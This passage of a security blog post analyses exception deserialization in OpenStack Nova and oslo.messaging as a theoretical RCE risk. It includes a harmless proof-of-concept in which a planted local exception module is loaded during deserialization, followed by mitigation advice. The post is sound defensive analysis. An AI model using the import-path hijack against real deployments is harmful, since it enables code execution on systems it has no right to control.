+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#39;tb&#39;</span>: tb,
+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#39;args&#39;</span>: failure<span style="color:#f92672">.</span>args,
+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#39;kwargs&#39;</span>: kwargs
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="deserialize_remote_exception"><strong>deserialize_remote_exception()</strong><a hidden class="anchor" aria-hidden="true" href="#deserialize_remote_exception">#</a></h3>
+<p>This function dynamically imports and reconstructs exception classes from RPC responses. It uses the <code>module</code> and <code>class</code> fields in the serialized data to locate the exception class and instantiate it with the provided arguments. While Nova restricts deserialization via <code>allowed_remote_exmods</code>, any misconfiguration or unsafe exception content (such as crafted <code>__str__()</code> methods) can still result in dangerous behavior if the reconstructed exception is logged or stringified later.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>_EXCEPTIONS_MODULE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;builtins&#39;</span>
+</span></span><span style="display:flex;"><span>_EXCEPTIONS_MODULES <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;exceptions&#39;</span>, <span style="color:#e6db74">&#39;builtins&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> module <span style="color:#f92672">in</span> _EXCEPTIONS_MODULES:
+</span></span><span style="display:flex;"><span>   module <span style="color:#f92672">=</span> _EXCEPTIONS_MODULE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> module <span style="color:#f92672">!=</span> _EXCEPTIONS_MODULE <span style="color:#f92672">and</span> module <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> allowed_remote_exmods:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> RemoteError(name, message, traceback)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mod <span style="color:#f92672">=</span> importutils<span style="color:#f92672">.</span>import_module(module)
+</span></span><span style="display:flex;"><span>klass <span style="color:#f92672">=</span> getattr(mod, name)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> issubclass(klass, <span style="color:#a6e22e">Exception</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(<span style="color:#f92672">...</span>)
+</span></span><span style="display:flex;"><span>exc <span style="color:#f92672">=</span> klass(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
+</span></span></code></pre></div><p>These functions expose str(e) as a potential RCE entry point if attacker-controlled classes are deserialized and logged.</p>
+<hr>
+<h3 id="openstack-products-and-custom-exception-namespaces"><strong>OpenStack Products and Custom Exception Namespaces</strong><a hidden class="anchor" aria-hidden="true" href="#openstack-products-and-custom-exception-namespaces">#</a></h3>
+<p>In some OpenStack products such as Ironic, exceptions are not limited to the Python builtins but are often defined in product-specific namespaces. For example, Ironic and related components use their own exception modules, and the list of allowed exception namespaces may include values like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>allowed_exception_namespaces <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ironic_lib.exception.&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ironic.common.exception.&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ironic_inspector.utils.&#39;</span>
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>See: <a href="https://docs.openstack.org/ironic-lib/wallaby/reference/api/ironic_lib.json_rpc.html">Ironic JSON RPC Reference</a></p>
+<p>Due to Python&rsquo;s import path resolution, if a local file exists that matches the expected module path (e.g., <code>ironic/common/exception.py</code>), that local file will be imported first. This means that if an attacker is able to upload or place a malicious exception file at the expected path, it could be loaded during deserialization. For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ironic.common <span style="color:#f92672">import</span> exception
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> oslo_messaging._drivers <span style="color:#f92672">import</span> common <span style="color:#66d9ef">as</span> exceptions
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;class&#34;: &#34;MyException&#34;, &#34;module&#34;: &#34;ironic.common.exception&#34;, &#34;message&#34;: &#34;</span><span style="color:#ae81ff">\uc5d0\ub7ec</span><span style="color:#e6db74">: test&#34;, &#34;tb&#34;: [&#34;MyException: </span><span style="color:#ae81ff">\uc5d0\ub7ec</span><span style="color:#e6db74">: test</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;], &#34;args&#34;: [&#34;test&#34;], &#34;kwargs&#34;: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">}&#39;</span>
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;ironic.common.exception&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># &lt;module &#39;ironic.common.exception&#39; from &#39;./ironic/common/exception.py&#39;&gt;</span>
+</span></span><span style="display:flex;"><span>exceptions<span style="color:#f92672">.</span>deserialize_remote_exception(e,[<span style="color:#e6db74">&#39;ironic.common.exception&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># execute init</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># MyException_Remote(&#39;test&#39;)</span>
+</span></span></code></pre></div><p>Contents of ironic/common/exception.py:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyException</span>(<span style="color:#a6e22e">Exception</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, msg):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;execute init&#34;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>msg <span style="color:#f92672">=</span> msg
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __str__(self):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;execute str&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;error: </span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>msg<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MyException(<span style="color:#e6db74">&#34;test&#34;</span>)
+</span></span></code></pre></div><p>This demonstrates that deserialization can instantiate attacker-controlled exception classes if the import path can be influenced or a malicious file is present locally.</p>
+<hr>
+<h2 id="challenges-to-exploitation"><strong>Challenges to Exploitation</strong><a hidden class="anchor" aria-hidden="true" href="#challenges-to-exploitation">#</a></h2>
+<ul>
+<li>
+<p>Requires access to the message broker (e.g., RabbitMQ)</p>
+</li>
+<li>
+<p>Tainted exception object must survive to a point where it is formatted</p>
+</li>
+<li>
+<p>Only classes in <code>allowed_remote_exmods</code> can be instantiated</p>
+</li>
+<li>
+<p>Many logging systems use <code>exc_info=True</code>, avoiding <code>str(e)</code></p>
+</li>
+</ul>
+<p>However, misconfigured systems, improper logging, or overbroad whitelisting may create a realistic attack path.</p>
+<hr>
+<h2 id="recommendations"><strong>Recommendations</strong><a hidden class="anchor" aria-hidden="true" href="#recommendations">#</a></h2>
+<ul>
+<li>
+<p>Strictly define and audit <code>allowed_remote_exmods</code></p>
+</li>
+<li>
+<p>Never <code>str()</code> or <code>repr()</code> exception objects directly in logs</p>
+</li>
+<li>
+<p>Prefer logging frameworks with <code>exc_info=True</code></p>
+</li>
+<li>
+<p>Sanitize all exception message content</p>
+</li>
+<li>
+<p>Use <code>RemoteError</code> as a fallback to avoid importing user-defined classes</p>
+</li>
+<li>
+<p>Review thread concurrency behaviors in RPC exception handling paths</p>
+</li>
+</ul>
+<hr>
+<h2 id="related-references-and-resources"><strong>Related References and Resources</strong><a hidden class="anchor" aria-hidden="true" href="#related-references-and-resources">#</a></h2>
+<ul>
+<li>
+<p><strong>OpenStack Trove RPC Security Specification</strong><br>
+<a href="https://specs.openstack.org/openstack/trove-specs/specs/ocata/secure-oslo-messaging-messages.html">https://specs.openstack.org/openstack/trove-specs/specs/ocata/secure-oslo-messaging-messages.html</a></p>
+</li>
+<li>
+<p><strong>ZeroMQ Removal of Pickle Support (Launchpad bug)</strong><br>
+<a href="https://bugs.launchpad.net/bugs/1582207">https://bugs.launchpad.net/bugs/1582207</a></p>
+</li>
+<li>
+<p><strong>OpenStack Security Guidelines: Avoid Dangerous Input Parsing Libraries</strong><br>
+<a href="https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html">https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html</a></p>
+</li>
+</ul>
+<hr>
+<h2 id="conclusion"><strong>Conclusion</strong><a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>This analysis demonstrates that certain exception serialization and deserialization patterns could, in theory, result in code execution if all other safeguards fail. However, the exploitability is limited by real-world constraints and OpenStack&rsquo;s layered defenses. The primary goal of this report is to help readers recognize and avoid insecure exception handling patterns, not to suggest that OpenStack is practically vulnerable to RCE via these mechanisms. Learning from these anti-patterns will help improve the security posture of distributed Python applications.</p>
+<p>Future work should explore automated tooling to detect vulnerable flows and validate exploit feasibility in controlled OpenStack environments.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/en/tags/openstack/">OpenStack</a></li>
+      <li><a href="http://localhost:1313/en/tags/nova/">Nova</a></li>
+      <li><a href="http://localhost:1313/en/tags/rce/">RCE</a></li>
+      <li><a href="http://localhost:1313/en/tags/vulnerability-analysis/">Vulnerability Analysis</a></li>
+      <li><a href="http://localhost:1313/en/tags/oslo.messaging/">Oslo.messaging</a></li>
+      <li><a href="http://localhost:1313/en/tags/exception-serialization/">Exception Serialization</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Endpoint Evasion Techniques (2020–2025): The Evolution of Attacks Bypassing EDR</span>
+  </a>
+</nav>
+
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on x"
+            href="https://x.com/intent/tweet/?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&amp;hashtags=OpenStack%2cNova%2cRCE%2cVulnerabilityAnalysis%2coslo.messaging%2cExceptionSerialization">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&amp;title=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;summary=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;source=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on reddit"
+            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&title=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on facebook"
+            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on whatsapp"
+            href="https://api.whatsapp.com/send?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned%20-%20http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on telegram"
+            href="https://telegram.me/share/url?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&u=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/en/">Code Before Breach</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+  function loadGiscus(theme) {
+    
+    document.querySelectorAll('.giscus-frame, script[src*="giscus.app"]').forEach(el => el.remove());
+
+    
+    const giscusScript = document.createElement("script");
+    giscusScript.src = "https://giscus.app/client.js";
+    giscusScript.setAttribute("data-repo", "windshock\/windshock.github.io");
+    giscusScript.setAttribute("data-repo-id", "MDEwOlJlcG9zaXRvcnkxODQ2MDMyMTk=");
+    giscusScript.setAttribute("data-category", "General");
+    giscusScript.setAttribute("data-category-id", "DIC_kwDOCwDSU84CoqLg");
+    giscusScript.setAttribute("data-mapping", "pathname");
+    giscusScript.setAttribute("data-reactions-enabled", "1");
+    giscusScript.setAttribute("data-theme", theme); 
+    giscusScript.setAttribute("data-lang", "en");
+    giscusScript.setAttribute("data-input-position", "bottom");
+    giscusScript.setAttribute("data-loading", "lazy");
+    giscusScript.crossOrigin = "anonymous";
+    giscusScript.async = true;
+
+    document.body.appendChild(giscusScript);
+  }
+
+  
+  const currentTheme = document.body.classList.contains("dark") ? "dark" : "light";
+  loadGiscus(currentTheme);
+
+  
+  const observer = new MutationObserver(() => {
+    const newTheme = document.body.classList.contains("dark") ? "dark" : "light";
+    loadGiscus(newTheme);
+  });
+
+  observer.observe(document.body, { attributes: true, attributeFilter: ['class'] });
+</script>
+
+
+
+<script>
+  function initSwiperIfNeeded() {
+    if (typeof Swiper === 'undefined') {
+      
+      return setTimeout(initSwiperIfNeeded, 50);
+    }
+
+    if (document.querySelector('.swiper')) {
+      new Swiper('.swiper', {
+        slidesPerView: 1.2,
+        spaceBetween: 16,
+        loop: true,
+        preloadImages: false,
+        lazy: {
+          loadOnTransitionStart: true,
+          loadPrevNext: true,
+        },
+        pagination: {
+          el: '.swiper-pagination',
+          clickable: true
+        },
+        breakpoints: {
+          768: { slidesPerView: 2.5 },
+          1024: { slidesPerView: 3.2 }
+        }
+      });
+
+      
+      document.querySelectorAll('img.swiper-lazy').forEach(img => {
+        img.src = img.dataset.src;
+      });
+    } else {
+      setTimeout(initSwiperIfNeeded, 100);
+    }
+  }
+
+  
+  initSwiperIfNeeded();
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
